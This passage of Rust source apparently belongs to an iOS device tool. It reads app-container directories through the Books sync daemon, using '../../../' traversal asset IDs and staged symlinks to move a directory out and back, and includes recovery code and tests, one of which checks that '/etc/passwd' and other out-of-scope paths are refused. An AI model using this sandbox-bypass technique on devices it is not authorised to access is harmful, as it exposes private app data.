/// no earlier sync used (STEP C derives its own, because it is a separate sync).
async fn pull_list_and_restore(
    pairing_path: &str,
    target_abs: &str,
    item_base: u64,
    logger: &Logger,
) -> Result<String, String> {
    let (parent, basename) = parent_and_basename(target_abs)?;
    let token = random_hex(10);
    let pull_dir = format!("{PULL_PREFIX}{token}");
    let link_dest = format!("{LINK_PREFIX}{token}");
    let read_dir = format!("{AIRLOCK_READ}/{token}");
    let record_path = format!("{read_dir}.json");

    let asset_id_pull = asset_id_for_device_path(target_abs)?;
    let asset_id_link = media_asset_id(&format!("{pull_dir}/{LINK_ENTRY}"));
    let asset_id_read = media_asset_id(&read_dir);

    logger.log(format!(
        "airlift: listing '{target_abs}' via pull/restore (token {token}, pull {pull_dir}, link {link_dest})"
    ));

    let (mut tunnel, mut afc) = open_session(pairing_path, logger).await?;
    let backup = BooksSyncBackup::capture(&mut afc, &token, logger).await;
    match backup.save_to_temp() {
        Ok(path) => logger.log(format!("airlift: sync-state snapshot saved to {path:?}")),
        Err(e) => logger.log(format!("airlift: could not save sync-state snapshot: {e}")),
    }
    // Self-heal: every past sync left dead `../../…` rows in the journal, and
    // those are what makes a repeat run look like the manifest was refused.
    clean_outstanding(&mut afc, logger).await;

    // ── STEP A: stage the restore symlink ──────────────────────────────────
    if let Err(e) = stage_restore_symlink(
        &mut tunnel,
        &mut afc,
        &pull_dir,
        &link_target_for_parent(&parent),
        logger,
    )
    .await
    {
        let _ = afc.remove_all(pull_dir.clone()).await;
        let _ = backup.restore(&mut afc, logger).await;
        return Err(format!("STEP A failed: {e}"));
    }

    // ── STEP B: pull the directory into Airlock/Read/<T> (one ATC session) ──
    //
    // From here on there is NO early return: once the sync has been submitted
    // the daemon owns the move and may complete it even when the session
    // reports an error. Skipping STEP C on the first `ObjectNotFound` is what
    // stranded real app data in the staging area, so every exit below happens
    // *after* a restore attempt.
    ensure_read_dir(&mut afc, logger).await;

    // The manifest keeps every catalog row the snapshot captured, so the
    // request looks like "download this one asset" instead of "replace the
    // whole catalog" — that difference is what made the Books asset state
    // one-shot.
    let preserved_pull = match backup.preserved_manifest_rows(std::slice::from_ref(&asset_id_pull)) {
        Ok(rows) => rows,
        Err(e) => {
            let _ = afc.remove_all(pull_dir.clone()).await;
            let _ = backup.restore(&mut afc, logger).await;
            return Err(format!("STEP B manifest failed: {e}"));
        }
    };
    logger.log(format!(
        "airlift: STEP B manifest carries {} preserved catalog row(s) plus 1 requested row",
        preserved_pull.len()
    ));
    if let Err(e) = write_books_plist(
        &mut afc,
        std::slice::from_ref(&asset_id_pull),
        &preserved_pull,
        item_base,
        logger,
    )
    .await
    {
        // The manifest never landed, so the daemon has nothing to act on and
        // nothing was moved. This is the one safe early exit in STEP B.
        let _ = afc.remove_all(pull_dir.clone()).await;
        let _ = backup.restore(&mut afc, logger).await;
        return Err(format!("STEP B manifest failed: {e}"));
    }

    let mut step_b_diag = SyncDiag::default();
    let step_b_sync_error = match atc_asset_sync(
        &mut tunnel,
        std::slice::from_ref(&asset_id_pull),
        &[read_dir.clone()],
        "STEP B pull",
        logger,
        &mut step_b_diag,
    )
    .await
    {
        Ok(()) => None,
        Err(e) => {
            logger.log(format!(
                "airlift: STEP B sync reported an error ({e}); continuing to the staged-listing retry and then to STEP C, because the daemon may still have moved the directory"
            ));
            Some(format!("STEP B pull failed: {e}"))
        }
    };

    // ── STEP B verification: bounded retry (the listing IS the check) ──
    let listed = wait_for_staged_listing(&mut afc, &read_dir, logger).await;
    let step_b_ok = listed.is_ok();
    let listing = match listed {
        Ok(json) => {
            logger.log(format!("airlift: STEP B pulled '{target_abs}' to {read_dir}"));
            log_nesting_probe(&json, &basename, logger);
            if json == "[]" {
                logger.log(format!(
                    "airlift: STEP B listing of {read_dir} is empty — the target directory was empty, or the daemon created an empty directory instead of moving it; restoring it back either way"
                ));
            }
            Some(json)
        }
        Err(e) => {
            logger.log(format!(
                "airlift: STEP B: {read_dir} never became listable after {STAGING_POLL_ATTEMPTS} attempts ({e})"
            ));
            // Explain the silence: the AFC error above says only that the
            // directory is not there, never why. The session's own record does.
            log_session_diag("STEP B pull", &step_b_diag, logger);
            if step_b_diag.sync_notices.is_empty() && !step_b_diag.manifest_observed {
                logger.log(format!(
                    "airlift: DIAG STEP B: the device neither sent an AssetManifest nor a SyncFailed for AssetID={asset_id_pull} → AssetPath={read_dir}; the daemon had no pending download for our requested asset"
                ));
            } else if !step_b_diag
                .manifest_entries
                .iter()
                .any(|entry| entry.starts_with(&asset_id_pull))
            {
                logger.log(format!(
                    "airlift: DIAG STEP B: the AssetManifest did not list our AssetID={asset_id_pull} (it listed: {})",
                    if step_b_diag.manifest_entries.is_empty() { "<none>".to_owned() } else { step_b_diag.manifest_entries.join(", ") }
                ));
            } else if step_b_diag
                .manifest_entries
                .iter()
                .any(|entry| entry.starts_with(&asset_id_pull) && entry.contains("IsDownload=false"))
            {
                logger.log(format!(
                    "airlift: DIAG STEP B: our AssetID={asset_id_pull} came back with IsDownload=false, so Books.plist was not accepted as a download request for it"
                ));
            }
            None
        }
    };
    // Kept only for the final error text — STEP C runs either way.
    let step_b_reason = step_b_sync_error
        .clone()
        .unwrap_or_else(|| format!("{read_dir} was not listable after the pull"));

    // ── STEP D (first half): restore the sync state, then the recovery record ──
    // STEP B's own sync journalled rows of its own, so the journal is cleaned
    // once more here — before the state is restored and STEP C runs.
    clean_outstanding(&mut afc, logger).await;
    // The STEP C manifest is written below anyway, so a restore problem here is
    // not fatal — but it is worth surfacing, and the final restore runs again.
    if let Err(e) = backup.restore(&mut afc, logger).await {
        logger.log(format!(
            "airlift: warning: Books sync state could not be restored after STEP B ({e}); continuing to STEP C"
        ));
    }

    // The recovery record has to be on disk *before* the restore is attempted,
    // otherwise an interrupted restore is unrecoverable. It is written whether
    // or not STEP B produced a staged copy: if the process dies mid-STEP-C this
    // record is what lets al_airlift_recover finish the job.
    let record = RecoveryRecord {
        target: target_abs.to_owned(),
        token: token.clone(),
        basename: basename.clone(),
        parent: parent.clone(),
    };
    if let Err(e) = write_recovery_record(&mut afc, &record, logger).await {
        let _ = afc.remove_all(pull_dir.clone()).await;
        let _ = backup.restore(&mut afc, logger).await;
        return Err(kept_at_error(
            &token,
            &format!(
                "the recovery record could not be written ({e}), so al_airlift_recover cannot finish this one automatically"
            ),
        ));
    }

    // ── STEP C restore (two FileCompletes in ONE session, symlink first) ──
    //
    // Attempted unconditionally. Whether STEP B reported success or not, this is
    // the only thing that can put a moved directory back, so "attempt the
    // restore and find it unnecessary" always beats "skip it and hope nothing
    // moved".
    // Same manifest shape as STEP B: the catalog rows the snapshot captured plus
    // the two restore rows. The sync state was restored just above, so these
    // rows describe exactly what the device had before this run started.
    let preserved_c = backup
        .preserved_manifest_rows(&[asset_id_link.clone(), asset_id_read.clone()])
        .unwrap_or_else(|e| {
            logger.log(format!(
                "airlift: warning: no preserved catalog rows for the STEP C manifest ({e})"
            ));
            Vec::new()
        });
    let mut step_c_diag = SyncDiag::default();
    let step_c_result = async {
        // STEP C is its own ATC session, so it needs its own `Item ID` base:
        // reusing STEP B's pair would have iOS drop both restore rows.
        let step_c_item_base = new_item_base();
        write_books_plist(
            &mut afc,
            &[asset_id_link.clone(), asset_id_read.clone()],
            &preserved_c,
            step_c_item_base,
            logger,
        )
        .await?;
        atc_asset_sync(
            &mut tunnel,
            &[asset_id_link, asset_id_read],
            &[link_dest.clone(), format!("{link_dest}/{basename}")],
            "STEP C restore",
            logger,
            &mut step_c_diag,
        )
        .await
    }
    .await;
    let step_c_ok = match step_c_result {
        Ok(()) => true,
        Err(e) => {
            // Not fatal by itself: the FileCompletes may have been applied before
            // the session gave up. The staging re-check below decides.
            logger.log(format!(
                "airlift: STEP C reported an error ({e}); re-checking whether the staged copy moved back"
            ));
            false
        }
    };

    // ── STEP D (second half): classify what actually happened ──
    //
    // The staging area is re-checked *after* STEP C, never before: the daemon
    // owns both moves, and only this ordering can tell "restored" apart from
    // "still parked".
    let still_staged = staging_present(&mut afc, &read_dir, RESTORE_POLL_ATTEMPTS, logger).await;
    let restored = format!("{link_dest}/{basename}");
    let destination_present = afc.get_file_info(restored.clone()).await.is_ok();

    match classify_restore(step_b_ok, step_c_ok, still_staged, destination_present) {
        RestoreOutcome::StillStaged => {
            // Keep the staged copy *and* its recovery record: deleting either
            // here is the data-loss bug. Only our own scaffolding goes.
            let _ = afc.remove_all(pull_dir.clone()).await;
            remove_quietly(&mut afc, &link_dest, logger).await;
            let _ = backup.restore(&mut afc, logger).await;
            let reason = match (step_c_ok, &step_b_sync_error) {
                (true, _) => step_b_reason.clone(),
                (false, Some(e)) => format!("{e}; STEP C restore also failed"),
                (false, None) => format!("{step_b_reason}; STEP C restore also failed"),
            };
            Err(kept_at_error(&token, &reason))
        }
        RestoreOutcome::NothingWasStaged => {
            // Nothing was ever moved, so STEP C had nothing to do — the restore
            // legitimately found no work. Clean up and report STEP B's reason
            // instead of pointing at a "kept at" copy that does not exist.
            logger.log(format!(
                "airlift: STEP C found nothing to restore ({read_dir} was never created); reporting the STEP B failure"
            ));
            remove_quietly(&mut afc, &read_dir, logger).await;
            remove_quietly(&mut afc, &record_path, logger).await;
            remove_quietly(&mut afc, &pull_dir, logger).await;
            remove_quietly(&mut afc, &link_dest, logger).await;
            let _ = backup.restore(&mut afc, logger).await;
            Err(step_b_reason)
        }
        RestoreOutcome::GoneUnconfirmed => {
            // The staged copy is gone but the destination was never confirmed:
            // either the daemon moved it somewhere unexpected or the restore
            // silently did nothing. There is nothing left to keep, so say that
            // plainly rather than claiming the data is parked and recoverable.
            let _ = afc.remove_all(pull_dir.clone()).await;
            remove_quietly(&mut afc, &link_dest, logger).await;
            let _ = backup.restore(&mut afc, logger).await;
            Err(format!(
                "STEP C: {read_dir} is gone but {restored} was never created; the directory may have been moved somewhere unexpected — re-open it and check"
            ))
        }
        RestoreOutcome::Restored => {
            remove_quietly(&mut afc, &read_dir, logger).await;
            remove_quietly(&mut afc, &record_path, logger).await;
            remove_quietly(&mut afc, &pull_dir, logger).await;
            remove_quietly(&mut afc, &link_dest, logger).await;
            let restore_err = backup.restore(&mut afc, logger).await.err();
            if !step_c_ok {
                logger.log(format!(
                    "airlift: STEP C reported an error but {read_dir} is gone and {restored} exists; treating it as restored"
                ));
            }
            logger.log(format!(
                "airlift: '{target_abs}' restored and staging cleaned up"
            ));
            if let Some(e) = restore_err {
                logger.log(format!("airlift: warning: {e}"));
            }
            Ok(listing.unwrap_or_else(|| "[]".to_owned()))
        }
    }
}

// ---------------------------------------------------------------------------
// Recovery
// ---------------------------------------------------------------------------

/// Finish a restore whose record survived in `Airlock/Read/<T>.json`.
///
/// Best-effort per record: each one stages a *fresh* symlink zip under a new
/// token (`airlift-pull-<T2>` / `airlift-link-<T2>`) and replays STEP C only —
/// the directory is already parked at `Airlock/Read/<T>`.
async fn restore_record(
    tunnel: &mut AppDeviceTunnel,
    afc: &mut AfcClient,
    record: &RecoveryRecord,
    backup: &BooksSyncBackup,
    item_base: u64,
    logger: &Logger,
) -> serde_json::Value {
    let mut result = serde_json::json!({ "target": record.target, "token": record.token });
    let parked = format!("{AIRLOCK_READ}/{}", record.token);

    if let Err(e) = record.validate() {
        result["status"] = serde_json::Value::String("rejected".to_owned());
        result["error"] = serde_json::Value::String(e);
        return result;
    }

    if afc.get_file_info(parked.clone()).await.is_err() {
        result["status"] = serde_json::Value::String("missing".to_owned());
        result["error"] = serde_json::Value::String(format!(
            "{parked} is gone; nothing left to restore"
        ));
        return result;
    }

    let token2 = random_hex(10);
    let pull_dir = format!("{PULL_PREFIX}{token2}");
    let link_dest = format!("{LINK_PREFIX}{token2}");
    let asset_id_link = media_asset_id(&format!("{pull_dir}/{LINK_ENTRY}"));
    let asset_id_read = media_asset_id(&parked);

    let preserved = backup
        .preserved_manifest_rows(&[asset_id_link.clone(), asset_id_read.clone()])
        .unwrap_or_else(|e| {
            logger.log(format!(
                "airlift: warning: no preserved catalog rows for the recover manifest ({e})"
            ));
            Vec::new()
        });
    let mut recover_diag = SyncDiag::default();
    let outcome = async {
        stage_restore_symlink(
            tunnel,
            afc,
            &pull_dir,
            &link_target_for_parent(&record.parent),
            logger,
        )
        .await?;
        write_books_plist(
            afc,
            &[asset_id_link.clone(), asset_id_read.clone()],
            &preserved,
            item_base,
            logger,
        )
        .await?;
        atc_asset_sync(
            tunnel,
            &[asset_id_link, asset_id_read],
            &[link_dest.clone(), format!("{link_dest}/{}", record.basename)],
            "recover",
            logger,
            &mut recover_diag,
        )
        .await
    }
    .await;

    let restored_at = format!("{link_dest}/{}", record.basename);
    match outcome {
        Ok(()) if afc.get_file_info(restored_at.clone()).await.is_ok() => {
            remove_quietly(afc, &parked, logger).await;
            remove_quietly(afc, &format!("{parked}.json"), logger).await;
            remove_quietly(afc, &pull_dir, logger).await;
            remove_quietly(afc, &link_dest, logger).await;
            result["status"] = serde_json::Value::String("restored".to_owned());
        }
        Ok(()) => {
            remove_quietly(afc, &pull_dir, logger).await;
            result["status"] = serde_json::Value::String("failed".to_owned());
            result["error"] = serde_json::Value::String(format!(
                "restore destination {restored_at} was not created; data kept at {parked}"
            ));
        }
        Err(e) => {
            remove_quietly(afc, &pull_dir, logger).await;
            result["status"] = serde_json::Value::String("failed".to_owned());
            result["error"] = serde_json::Value::String(format!(
                "{e}; data kept at {parked}"
            ));
        }
    }
    result
}

/// Scan `Airlock/Read` for `*.json` recovery records and finish each of them.
async fn recover_read_dirs(pairing_path: &str, logger: &Logger) -> Result<String, String> {
    let (mut tunnel, mut afc) = open_session(pairing_path, logger).await?;

    let names = afc
        .list_dir(AIRLOCK_READ)
        .await
        .map_err(|e| format!("AFC list {AIRLOCK_READ}: {e:?}"))?;
    let records: Vec<String> = names
        .into_iter()
        .filter(|name| !name.is_empty() && name != "." && name != "..")
        .filter(|name| name.ends_with(".json"))
        .collect();
    if records.is_empty() {
        logger.log(format!("airlift: no recovery records in {AIRLOCK_READ}"));
        return Ok(serde_json::Value::Array(Vec::new()).to_string());
    }

    logger.log(format!(
        "airlift: recovering {} parked director{} from {AIRLOCK_READ}",
        records.len(),
        if records.len() == 1 { "y" } else { "ies" }
    ));

    let mut results: Vec<serde_json::Value> = Vec::with_capacity(records.len());
    for name in records {
        let path = format!("{AIRLOCK_READ}/{name}");
        let backup = BooksSyncBackup::capture(&mut afc, &random_hex(10), logger).await;
        let record = match read_recovery_record(&mut afc, &path, logger).await {
            Ok(record) => record,
            Err(e) => {
                let mut result = serde_json::json!({ "record": path, "status": "unreadable" });
                result["error"] = serde_json::Value::String(e);
                results.push(result);
                continue;
            }
        };
        let result = restore_record(
            &mut tunnel,
            &mut afc,
            &record,
            &backup,
            new_item_base(),
            logger,
        )
        .await;
        clean_outstanding(&mut afc, logger).await;
        let _ = backup.restore(&mut afc, logger).await;
        results.push(result);
    }

    Ok(serde_json::Value::Array(results).to_string())
}

async fn read_recovery_record(
    afc: &mut AfcClient,
    path: &str,
    logger: &Logger,
) -> Result<RecoveryRecord, String> {
    let mut fd = afc
        .open(path.to_owned(), AfcFopenMode::RdOnly)
        .await
        .map_err(|e| format!("AFC open {path}: {e:?}"))?;
    let read = fd.read_entire().await;
    let _ = fd.close().await;
    let bytes = read.map_err(|e| format!("AFC read {path}: {e:?}"))?;
    serde_json::from_slice::<RecoveryRecord>(&bytes)
        .map_err(|e| format!("{path} is not an airlift recovery record: {e}"))
        .map_err(|e| {
            logger.log(format!("airlift: {e}"));
            e
        })
}

// ---------------------------------------------------------------------------
// FFI entry points
// ---------------------------------------------------------------------------

/// List a directory anywhere under an app container without HouseArrest.
///
/// `path` is a real device path (`/var/mobile/Containers/…`,
/// `/var/mobile/Applications/…`). `out_json` receives exactly what
/// `al_dir_list` emits: `[{"name":…,"is_dir":…,"size":…}, …]`.
///
/// Blocks for several seconds (two ATC syncs). On failure after the pull has
/// succeeded the error string contains `kept at Airlock/Read/<T>` so the caller
/// can offer `al_airlift_recover`.
///
/// # Safety
/// All pointer args must be null or valid for their documented use.
pub unsafe fn list_dir(
    pairing_path: *const c_char,
    path: *const c_char,
    log_cb: ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    if out_json.is_null() && out_error.is_null() {
        return 2;
    }
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let requested = opt_str(path, "");
    let ctx_usize = ctx as usize;

    let res = run_with_large_stack("al_airlift_list_dir", move || {
        let logger = Logger::new(log_cb, ctx_usize as *mut c_void);
        let target = checked_pull_path(&requested)?;
        // One ATC sync at a time, process-wide, shared with the AFC browser.
        let _guard = lock_tunnel("al_airlift_list_dir");
        idevice_ffi::run_sync_local(pull_list_and_restore(
            &pairing_path,
            &target,
            new_item_base(),
            &logger
        ))
    });

    finish_string_result(res, "al_airlift_list_dir", out_json, out_error)
}

/// Finish every interrupted pull still parked in `Airlock/Read`.
///
/// `out_json` receives `[{"target":…,"token":…,"status":"restored"|"failed"|"missing"|…, …}]`.
///
/// # Safety
/// All pointer args must be null or valid for their documented use.
pub unsafe fn recover(
    pairing_path: *const c_char,
    log_cb: ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    if out_json.is_null() && out_error.is_null() {
        return 2;
    }
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let ctx_usize = ctx as usize;

    let res = run_with_large_stack("al_airlift_recover", move || {
        let logger = Logger::new(log_cb, ctx_usize as *mut c_void);
        let _guard = lock_tunnel("al_airlift_recover");
        idevice_ffi::run_sync_local(recover_read_dirs(&pairing_path, &logger))
    });

    finish_string_result(res, "al_airlift_recover", out_json, out_error)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::{
        asset_id_for_device_path, build_pull_manifest, checked_pull_path,
        link_target_for_parent, media_asset_id, parent_and_basename, preserved_rows,
        BackupState, BooksSyncBackup, RecoveryRecord, SyncDiag, BOOKS_PLIST,
    };

    const UUID_DIR: &str = "/var/mobile/Containers/Data/Application/DEADBEEF-0000-0000-0000-000000000000/Documents";

    #[test]
    fn container_paths_are_accepted() {
        assert_eq!(checked_pull_path(UUID_DIR).unwrap(), UUID_DIR);
        assert_eq!(
            checked_pull_path("/var/mobile/Containers/Shared/AppGroup/GROUP/Library/Caches")
                .unwrap(),
            "/var/mobile/Containers/Shared/AppGroup/GROUP/Library/Caches"
        );
        assert_eq!(
            checked_pull_path("/var/mobile/Applications/Some.app/PlugIns").unwrap(),
            "/var/mobile/Applications/Some.app/PlugIns"
        );
        assert_eq!(
            checked_pull_path("/var/mobile/Containers/Data/Application").unwrap(),
            "/var/mobile/Containers/Data/Application"
        );
    }

    #[test]
    fn paths_are_normalised() {
        assert_eq!(
            checked_pull_path(&format!("/private{UUID_DIR}")).unwrap(),
            UUID_DIR
        );
        assert_eq!(
            checked_pull_path(&format!("{UUID_DIR}/")).unwrap(),
            UUID_DIR
        );
        assert_eq!(
            checked_pull_path(&format!("{UUID_DIR}//Library//Caches")).unwrap(),
            format!("{UUID_DIR}/Library/Caches")
        );
    }

    #[test]
    fn everything_outside_the_containers_is_refused() {
        for bad in [
            "",
            "var/mobile/Containers/Data/Application",
            "/var/mobile/Containers/Data/Application/../Library",
            "/var/mobile/Containers/Data/ApplicationX/foo",
            "/var/mobile/Media/Books/Sync",
            "/var/mobile/Media",
            "/var/mobile/Library/SpringBoard",
            "/etc",
            "/var/tmp",
            "/var/mobile",
            "/private/var/mobile/Library",
            "/var/mobile/Airlock/Read",
        ] {
            assert!(
                checked_pull_path(bad).is_err(),
                "{bad} should be refused"
            );
        }
    }

    #[test]
    fn asset_ids_use_the_books_sync_base() {
        // ../../.. is /var/mobile, so the tail must be relative to it.
        assert_eq!(
            asset_id_for_device_path(UUID_DIR).unwrap(),
            "../../../Containers/Data/Application/DEADBEEF-0000-0000-0000-000000000000/Documents"
        );
        assert_eq!(
            asset_id_for_device_path("/var/mobile/Applications/Some.app").unwrap(),
            "../../../Applications/Some.app"
        );
        // The Media-root spelling is two levels up only.
        assert_eq!(media_asset_id("airlift-pull-abc/p0/p1/p2/link"), "../../airlift-pull-abc/p0/p1/p2/link");
        assert_eq!(media_asset_id("Airlock/Read/abc"), "../../Airlock/Read/abc");
        assert!(asset_id_for_device_path("/etc/passwd").is_err());
        assert!(asset_id_for_device_path("/var/mobile").is_err());
    }

    #[test]
    fn link_target_is_three_levels_up_from_the_media_root() {
        let parent = "/var/mobile/Containers/Data/Application/DEADBEEF-0000-0000-0000-000000000000";
        assert_eq!(
            link_target_for_parent(parent),
            "../../../var/mobile/Containers/Data/Application/DEADBEEF-0000-0000-0000-000000000000"
        );
    }

    #[test]
    fn parent_and_basename_split() {
        assert_eq!(
            parent_and_basename(UUID_DIR).unwrap(),
            (
                "/var/mobile/Containers/Data/Application/DEADBEEF-0000-0000-0000-000000000000".to_owned(),
                "Documents".to_owned()
            )
        );
        assert!(parent_and_basename("/var/mobile").is_err());
        assert!(parent_and_basename("/").is_err());
    }

    #[test]
    fn backup_json_round_trips() {
        let backup = BooksSyncBackup {
            token: "abc".to_owned(),
            entries: vec![
                (
                    "Books/Sync/Books.plist".to_owned(),
                    BackupState::Present { data_b64: "AAEC".to_owned() },
                ),
                ("Books/Sync/Upload.plist".to_owned(), BackupState::Absent),
                (
                    "Books/Sync/Database/OutstandingAssets_4.sqlite".to_owned(),
                    BackupState::Untouched,
                ),
            ],
        };
        let bytes = serde_json::to_vec(&backup).unwrap();
        let parsed: BooksSyncBackup = serde_json::from_slice(&bytes).unwrap();
        assert_eq!(parsed.token, backup.token);
        assert_eq!(parsed.entries, backup.entries);
    }

    /// A stand-in for the device's own catalog rows. Key set and value types
    /// follow a real Books.plist row as the AirCard reference expects it
    /// (acl/crates/core/src/books.rs:107-127 keeps every row verbatim, and its
    /// own test fixture at acl/crates/core/src/books.rs:211-215 shows the keys a
    /// row carries: `Persistent ID`, `Path`, `Name`).
    fn catalog_row(id: &str, path: &str, name: &str) -> plist::Value {
        let mut row = plist::Dictionary::new();
        row.insert(
            "Persistent ID".to_owned(),
            plist::Value::String(id.to_owned()),
        );
        row.insert("Path".to_owned(), plist::Value::String(path.to_owned()));
        row.insert("Name".to_owned(), plist::Value::String(name.to_owned()));
        plist::Value::Dictionary(row)
    }

    fn catalog_plist(rows: Vec<plist::Value>) -> Vec<u8> {
        let mut top = plist::Dictionary::new();
        top.insert("Books".to_owned(), plist::Value::Array(rows));
        let mut buf = Vec::new();
        plist::to_writer_binary(&mut buf, &plist::Value::Dictionary(top)).unwrap();
        buf
    }

    #[test]
    fn pull_manifest_marks_the_asset_requested_and_keeps_catalog_rows() {
        // Every key/value below is pinned against the verified AirCard
        // reference, not invented:
        //   Persistent ID  acl/crates/core/src/books.rs:74
        //   Item ID        acl/crates/core/src/books.rs:75 ("1") and
        //                  acl/crates/core/src/customization.rs:199 (`n + 1`)
        //   DSID           acl/crates/core/src/books.rs:76 ("1") and
        //                  acl/crates/core/src/customization.rs:200
        //   preserved rows verbatim, requested row appended last
        //                  acl/crates/core/src/books.rs:149-150
        //   preserved rows come back as IsDownload=false
        //                  acl/crates/airtraffic/src/lib.rs:169-171
        // The fixed `Item ID` of the reference is the regression below: this
        // test pins it with item_base = 0, `pull_manifest_item_ids_are_unique_per_sync`
        // pins the fix.
        let preserved = vec![
            catalog_row("existing-id-1", "Purchases/one.epub", "One"),
            catalog_row("existing-id-2", "Purchases/two.epub", "Two"),
        ];
        let requested = vec!["../../../Containers/Data/Application/DEADBEEF/Documents".to_owned()];

        let bytes = build_pull_manifest(&requested, &preserved, 0).unwrap();
        assert_eq!(&bytes[..8], b"bplist00", "manifest must stay a binary plist");

        let decoded = plist::from_bytes::<plist::Value>(&bytes).unwrap();
        let rows = decoded
            .as_dictionary()
            .unwrap()
            .get("Books")
            .and_then(plist::Value::as_array)
            .unwrap()
            .clone();

        // 2 preserved + 1 requested.
        assert_eq!(rows.len(), 3);
        // Preserved rows are re-emitted byte-identical, in order, before ours.
        assert_eq!(rows[0], preserved[0]);
        assert_eq!(rows[1], preserved[1]);

        let requested_row = rows[2].as_dictionary().unwrap();
        assert_eq!(
            requested_row.get("Persistent ID").and_then(plist::Value::as_string),
            Some(requested[0].as_str())
        );
        assert_eq!(
            requested_row.get("Item ID").and_then(plist::Value::as_string),
            Some("1")
        );
        assert_eq!(
            requested_row.get("DSID").and_then(plist::Value::as_string),
            Some("1")
        );

        // Two requested rows (the STEP C restore) number 1 and 2, DSID "1" both
        // times — acl/crates/core/src/customization.rs:198-200.
        let two = build_pull_manifest(
            &["../../airlift-pull-abc/p0/p1/p2/link".to_owned(), "../../Airlock/Read/abc".to_owned()],
            &[],
            0,
        )
        .unwrap();
        let two_rows = plist::from_bytes::<plist::Value>(&two)
            .unwrap()
            .as_dictionary()
            .unwrap()["Books"]
            .as_array()
            .unwrap()
            .clone();
        assert_eq!(two_rows.len(), 2);
        let ids: Vec<&str> = two_rows
            .iter()
            .map(|r| {
                r.as_dictionary()
                    .unwrap()
                    .get("Item ID")
                    .and_then(plist::Value::as_string)
                    .unwrap()
            })
            .collect();
        assert_eq!(ids, vec!["1", "2"]);
        for row in &two_rows {
            assert_eq!(
                row.as_dictionary()
                    .unwrap()
                    .get("DSID")
                    .and_then(plist::Value::as_string),
                Some("1")
            );
        }
    }

    /// Regression guard for "the first run works, the second one never lists":
    /// iOS dedupes outstanding Book assets by `(DSID, Item ID)`, so a manifest
    /// that always spells `(1, 1)` is consumed by the first sync and silently
    /// dropped from every later AssetManifest. A non-zero `item_base` has to
    /// push the rows off that pair.
    #[test]
    fn pull_manifest_item_ids_are_unique_per_sync() {
        let requested = vec![
            "../../airlift-pull-abc/p0/p1/p2/link".to_owned(),
            "../../Airlock/Read/abc".to_owned(),
            "../../airlift-recovered-abc".to_owned(),
        ];
        let rows_of = |item_base: u64| -> Vec<String> {
            let bytes = build_pull_manifest(&requested, &[], item_base).unwrap();
            plist::from_bytes::<plist::Value>(&bytes)
                .unwrap()
                .as_dictionary()
                .unwrap()["Books"]
                .as_array()
                .unwrap()
                .clone()
                .iter()
                .map(|row| {
                    row.as_dictionary()
                        .unwrap()
                        .get("Item ID")
                        .and_then(plist::Value::as_string)
                        .unwrap()
                        .to_owned()
                })
                .collect()
        };

        // Base 0 reproduces the reference: "1", "2", "3".
        assert_eq!(rows_of(0), vec!["1", "2", "3"]);

        // A real per-sync base shifts every row by the same amount, so the
        // pairs stay distinct within the manifest *and* differ from the pair
        // the previous sync used.
        let first = rows_of(1_234_567_890);
        assert_eq!(first, vec!["1234567891", "1234567892", "1234567893"]);
        let second = rows_of(1_234_567_900);
        assert_eq!(second, vec!["1234567901", "1234567902", "1234567903"]);

        // Nothing in either manifest may collide with the pair iOS already
        // consumed, nor with each other.
        for base in [1_234_567_890, 1_234_567_900] {
            let ids = rows_of(base);
            let unique: std::collections::HashSet<&String> = ids.iter().collect();
            assert_eq!(unique.len(), ids.len(), "rows {ids:?} must not repeat");
            assert!(
                !ids.iter().any(|id| id == "1"),
                "base {base} still emits the consumed (DSID 1, Item ID 1) pair: {ids:?}"
            );
        }
    }

    /// The outstanding-asset journal is volatile: byte-comparing it against a
    /// snapshot only produces false conflicts, so it must never be snapshotted
    /// or restored, and it has to be found by the `OutstandingAssets_*` glob
    /// rather than by the single `OutstandingAssets_4` spelling.
    #[test]
    fn the_outstanding_asset_journal_counts_as_volatile() {
        for volatile_path in [
            "Books/Sync/Database/OutstandingAssets_4.sqlite",
            "Books/Sync/Database/OutstandingAssets_4.sqlite-wal",
            "Books/Sync/Database/OutstandingAssets_4.sqlite-shm",
            "Books/Sync/OutstandingAssets_4.sqlite",
            "Books/Sync/Database/OutstandingAssets_9.sqlite",
        ] {
            assert!(
                super::is_volatile_sync_state(volatile_path),
                "{volatile_path} must be treated as volatile"
            );
        }
        // Everything that is genuinely restorable must not be swept up by the
        // glob: the catalog manifest is the one file a restore has to rewrite.
        for kept in [
            BOOKS_PLIST,
            "Books/Sync/Books.plist-wal",
            "Books/Sync/Upload.plist",
        ] {
            assert!(
                !super::is_volatile_sync_state(kept),
                "{kept} must stay restorable"
            );
        }

        // A snapshot taken before the journal was declared volatile must not be
        // able to resurrect its rows: restore skips volatile paths whatever the
        // recorded state says.
        let backup: BooksSyncBackup = serde_json::from_slice(
            br#"{"token":"t","entries":[
                ["Books/Sync/Database/OutstandingAssets_4.sqlite",{"state":"present","data_b64":"AAECAw=="}],
                ["Books/Sync/Books.plist",{"state":"present","data_b64":"AAECAw=="}]
            ]}"#,
        )
        .unwrap();
        assert_eq!(
            backup.entries[0].0,
            "Books/Sync/Database/OutstandingAssets_4.sqlite"
        );
    }

    #[test]
    fn preserved_rows_are_read_from_the_snapshot_and_deduped() {
        let snapshot = catalog_plist(vec![
            catalog_row("keep-1", "Purchases/one.epub", "One"),
            // A stale row for the very asset this run requests: dropped, because
            // the requested row is appended fresh (acl/crates/core/src/books.rs:123-125).
            catalog_row("../../../Containers/Data/Application/DEADBEEF/Documents", "x", "x"),
            catalog_row("keep-1", "Purchases/dupe.epub", "Dupe"),
            catalog_row("keep-2", "Purchases/two.epub", "Two"),
            // No Persistent ID: skipped (acl/crates/core/src/books.rs:109-112).
            plist::Value::Dictionary({
                let mut d = plist::Dictionary::new();
                d.insert("Name".to_owned(), plist::Value::String("orphan".into()));
                d
            }),
        ]);
        let requested = vec!["../../../Containers/Data/Application/DEADBEEF/Documents".to_owned()];
        let (rows, ids) = preserved_rows(Some(&snapshot), &requested).unwrap();
        assert_eq!(ids, vec!["keep-1".to_owned(), "keep-2".to_owned()]);
